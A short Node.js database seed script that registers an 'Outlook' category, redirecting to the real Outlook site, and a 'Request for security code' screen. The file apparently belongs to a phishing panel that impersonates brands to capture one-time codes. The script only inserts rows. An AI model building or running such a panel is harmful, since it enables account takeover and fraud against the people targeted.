const { db, initDb } = require('./database');

async function seed() {
    await initDb();

    db.serialize(() => {
        // Insert Categories
        const categories = [
            ['Outlook', 'https://outlook.live.com/mail/'],
        ];

        const catStmt = db.prepare(`INSERT OR IGNORE INTO categories (name, default_redirect_url) VALUES (?, ?)`);
        categories.forEach(c => catStmt.run(c));
        catStmt.finalize();

        // Insert Screens linked to Categories
        const screens = [
            // Banking
            [1, 'Request for security code', 'code.html', 1]
        ];

        const screenStmt = db.prepare(`INSERT INTO screens (category_id, screen_name, file_path, is_default) VALUES (?, ?, ?, ?)`);
        screens.forEach(s => screenStmt.run(s));
        screenStmt.finalize();

        console.log("Seeding complete.");
    });
}

seed();